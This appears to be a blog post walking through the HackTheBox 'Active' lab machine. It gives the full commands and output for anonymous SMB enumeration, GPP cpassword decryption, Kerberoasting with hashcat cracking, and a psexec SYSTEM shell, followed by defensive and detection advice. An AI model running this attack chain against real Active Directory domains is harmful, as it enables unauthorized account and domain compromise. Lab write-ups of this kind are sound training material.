---
layout: post
title: "Active HTB Walkthrough: GPP Password Exploitation and Kerberoasting"
date: 2025-08-31 16:00:00 -0500
categories: [Penetration Testing, Active Directory]
tags: [HackTheBox, Active Directory, GPP, Group Policy Preferences, Kerberoasting, SMB, PSExec]
description: "Comprehensive walkthrough of the Active machine on HackTheBox, demonstrating Group Policy Preferences password decryption, SMB enumeration, Kerberoasting attacks, and obtaining Domain Admin access via PSExec."
image: /assets/blog/active.png
toc: true
math: false
---

## Overview

Active is a Windows-based HackTheBox machine that demonstrates classic Active Directory misconfigurations, particularly the exploitation of Group Policy Preferences (GPP) passwords and Kerberoasting attacks. This walkthrough showcases the complete attack chain from initial reconnaissance to full domain compromise.

**Target Information:**
- **Target IP:** 10.10.10.100
- **Domain:** active.htb
- **OS:** Windows Server 2008 R2 SP1
- **Hostname:** DC

## Initial Reconnaissance

### Port Scanning

I initiated reconnaissance with an aggressive Nmap scan to identify all available services:

```bash
nmap -T4 -A -v 10.10.10.100
```

**Key Findings:**

| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Microsoft DNS 6.1.7601 |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows NetBIOS-SSN |
| 389 | LDAP | Active Directory LDAP |
| 445 | SMB | Microsoft-DS |
| 464 | Kpasswd5 | Password change service |
| 593 | RPC/HTTP | RPC over HTTP 1.0 |
| 636 | LDAPS | LDAP over SSL |
| 3268 | Global Catalog | Active Directory GC |
| 3269 | Global Catalog SSL | GC over SSL |

**OS Detection:** Windows Server 2008 R2 SP1  
**Domain:** active.htb  
**Uptime:** Approximately 7 hours

The scan revealed a standard domain controller configuration with all typical AD services exposed.

## SMB Enumeration

### Share Discovery

I utilized `enum4linux` to enumerate SMB shares and gather information about the target:

```bash
enum4linux -a 10.10.10.100
```

**Discovered Shares:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Replication     Disk      
SYSVOL          Disk      Logon server share 
Users           Disk
```

**Share Permissions Analysis:**

| Share | Mapping | Listing | Notes |
|-------|---------|---------|-------|
| ADMIN$ | DENIED | N/A | Administrative share |
| C$ | DENIED | N/A | System drive |
| IPC$ | OK | DENIED | Inter-process communication |
| NETLOGON | DENIED | N/A | Domain logon scripts |
| **Replication** | **OK** | **OK** | **Accessible without authentication** |
| SYSVOL | DENIED | N/A | Group Policy storage |
| Users | DENIED | N/A | User home directories |

The **Replication** share stood out as it was both mappable and listable without authentication—a significant security misconfiguration.

### Exploring the Replication Share

I connected to the Replication share using smbclient:

```bash
smbclient //10.10.10.100/Replication -U ""%""
```

Navigating through the directory structure:

```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

I discovered a critical file: **Groups.xml**

This file is part of Group Policy Preferences and historically stored passwords encrypted with a publicly known AES key.

## Group Policy Preferences Exploitation

### Understanding GPP Vulnerability

Group Policy Preferences (GPP) allowed administrators to set local administrator passwords via Group Policy. Prior to the MS14-025 patch, these passwords were stored in SYSVOL in XML files, encrypted with a publicly available AES-256 key. This made them trivially decryptable by anyone with read access to SYSVOL or related shares.

### Extracting the GPP Password

I downloaded the Groups.xml file:

```bash
get Groups.xml
```

**File Contents:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" 
        image="2" 
        changed="2018-07-18 20:46:06" 
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" 
                newName="" 
                fullName="" 
                description="" 
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                changeLogon="0" 
                noChange="1" 
                neverExpires="1" 
                acctDisabled="0" 
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

**Identified Credentials:**
- **Username:** SVC_TGS
- **Encrypted Password (cpassword):** `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

### Decrypting the GPP Password

I used the `gpp-decrypt` tool to decrypt the password:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

**Decrypted Password:** `GPPstillStandingStrong2k18`

**Valid Credentials:**
- **Username:** `SVC_TGS`
- **Password:** `GPPstillStandingStrong2k18`

## Authenticated SMB Enumeration

### Validating Access

With valid credentials, I enumerated shares accessible to the `SVC_TGS` account:

```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

**Results:**

```
[+] IP: 10.10.10.100:445        Name: active.htb
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        C$                      NO ACCESS       Default share
        IPC$                    NO ACCESS       Remote IPC
        NETLOGON                READ ONLY       Logon server share
        Replication             READ ONLY
        SYSVOL                  READ ONLY       Logon server share
        Users                   READ ONLY
```

The `SVC_TGS` account now had READ access to the **Users** share, which typically contains user home directories.

### User Flag Retrieval

I connected to the Users share:

```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

Navigating to the SVC_TGS user's desktop:

```bash
smb: \SVC_TGS\Desktop\> ls
smb: \SVC_TGS\Desktop\> get user.txt
```

**User Flag:** `1760****************************4fe` (obfuscated)

## Privilege Escalation via Kerberoasting

### Service Principal Name Enumeration

Kerberoasting exploits service accounts configured with Service Principal Names (SPNs). By requesting Ticket Granting Service (TGS) tickets for these SPNs, an attacker can obtain encrypted tickets that can be cracked offline.

I used Impacket's `GetUserSPNs.py` script to enumerate SPNs:

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

**Results:**

```
ServicePrincipalName  Name           MemberOf  PasswordLastSet             LastLogon
--------------------  -------------  --------  --------------------------  ---------
active/CIFS:445       Administrator            2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520
```

The **Administrator** account had an SPN configured, making it vulnerable to Kerberoasting. The script automatically requested and saved the TGS ticket hash.

### Hash Cracking

I utilized HashCat to crack the Kerberos TGS-REP hash:

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt
```

**Hash Type:** `-m 13100` (Kerberos 5, etype 23, TGS-REP)  
**Attack Mode:** `-a 0` (Straight/Dictionary attack)

**HashCat Output:**

```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8b8c2a0340e51c2041b9fb3066b2b80c$[...]:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Sat Aug 30 22:22:02 2025 (4 secs)
Speed.#1.........: 2814.0 kH/s
Recovered........: 1/1 (100.00%) Digests
```

**Cracked in 4 seconds!**

**Administrator Credentials:**
- **Username:** `Administrator`
- **Password:** `Ticketmaster1968`

## Domain Administrator Access

### PSExec Exploitation

With Domain Administrator credentials, I used Impacket's `psexec.py` to obtain a SYSTEM shell:

```bash
psexec.py active.htb/administrator@10.10.10.100
```

**Authentication:** Password-based (Ticketmaster1968)

```bash
Impacket v0.12.0 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file WvaAQjeJ.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service nVQy on 10.10.10.100.....
[*] Starting service nVQy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Root Flag Retrieval

Navigating to the Administrator's desktop:

```bash
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
```

**Root Flag:** `2926****************************d1a` (obfuscated)

## Attack Chain Summary

1. **Port Scanning:** Identified domain controller services via Nmap
2. **SMB Enumeration:** Discovered unauthenticated access to Replication share
3. **GPP Password Extraction:** Found Groups.xml containing encrypted cpassword
4. **Credential Decryption:** Used gpp-decrypt to obtain SVC_TGS credentials
5. **Authenticated Enumeration:** Gained read access to Users share, retrieved user flag
6. **Kerberoasting:** Enumerated SPNs and extracted Administrator TGS hash
7. **Hash Cracking:** Cracked Kerberos hash with HashCat in 4 seconds
8. **PSExec Lateral Movement:** Obtained SYSTEM shell with Administrator credentials
9. **Domain Compromise:** Retrieved root flag and achieved full domain control

## Key Vulnerabilities

### Critical Findings

1. **Unauthenticated SMB Access:** Replication share accessible without credentials
2. **GPP Password Exposure:** Groups.xml file containing cpassword attribute in SYSVOL-like location
3. **Weak Service Account Password:** Dictionary-based password on Administrator SPN
4. **Kerberoasting Vulnerability:** High-privilege account (Administrator) configured with SPN
5. **Unrestricted PSExec Access:** No restrictions on administrative remote access

### Risk Assessment

| Vulnerability | Severity | Impact |
|---------------|----------|---------|
| Anonymous SMB Access | High | Information disclosure |
| GPP Password Decryption | Critical | Account compromise |
| Kerberoasting (Admin SPN) | Critical | Privilege escalation to DA |
| Weak Password Policy | High | Rapid credential compromise |

## Defensive Recommendations

### Immediate Actions

1. **Remove GPP Passwords:** 
   - Audit all Group Policy objects for cpassword attributes
   - Apply MS14-025 patch if not already deployed
   - Migrate to Local Administrator Password Solution (LAPS)

2. **Restrict SMB Access:**
   - Disable anonymous enumeration of shares
   - Implement network segmentation
   - Enable SMB signing and encryption

3. **Kerberoasting Mitigation:**
   - Remove SPNs from high-privilege accounts when possible
   - Use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs)
   - Implement 25+ character passwords for service accounts
   - Enable Advanced Audit Policy for Kerberos TGS requests

4. **Password Policy Enhancement:**
   - Enforce minimum 15-character passwords for service accounts
   - Implement periodic password rotation
   - Deploy password filters to prevent common patterns

### Long-term Security Improvements

1. **Credential Management:**
   - Deploy LAPS for local administrator accounts
   - Implement gMSAs for all service accounts
   - Enable Protected Users security group for sensitive accounts

2. **Monitoring and Detection:**
   - Monitor for unusual Kerberos TGS requests
   - Alert on SYSVOL/Replication share access
   - Implement honeypot accounts with SPNs
   - Track privileged account logon events

3. **Network Security:**
   - Deploy least privilege access model
   - Implement tiered administrative model
   - Use Privileged Access Workstations (PAWs)
   - Enable Windows Defender Credential Guard

4. **Audit and Compliance:**
   - Regular penetration testing and red team exercises
   - Quarterly review of Group Policy configurations
   - Continuous monitoring of service account SPNs
   - Annual security architecture review

## Tools Used

- **Nmap:** Network reconnaissance and service enumeration
- **Enum4linux:** SMB share and user enumeration
- **Smbclient:** SMB share access and file retrieval
- **Smbmap:** Share permission enumeration
- **gpp-decrypt:** GPP cpassword decryption
- **Impacket Suite:** GetUserSPNs.py, psexec.py
- **HashCat:** Kerberos hash cracking

## Technical Notes

### GPP Decryption Process

The GPP vulnerability exists because Microsoft published the AES-256 key used to encrypt cpasswords in 2012. The key is:

```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

This allows anyone with access to the encrypted cpassword to trivially decrypt it, regardless of the password's complexity.

### Kerberoasting Mechanics

When a TGS ticket is requested, the KDC encrypts the ticket using the service account's password hash. This encrypted ticket can be captured and cracked offline. The attack doesn't require elevated privileges—any domain user can request TGS tickets for any SPN.

### Detection Opportunities

Organizations can detect Kerberoasting by monitoring Event ID 4769 (Kerberos TGS request) with the following characteristics:
- Ticket Encryption Type: 0x17 (RC4)
- Service Name: not krbtgt
- Failure Code: 0x0 (success)
- High volume of requests from a single account

## References

- [MS14-025 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
- [GPP Password Exploitation](https://adsecurity.org/?p=2288)
- [Kerberoasting Explained](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- [Impacket GitHub Repository](https://github.com/fortra/impacket)
- [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899)

---

*This writeup is for educational purposes only. Always obtain proper authorization before performing security testing.*
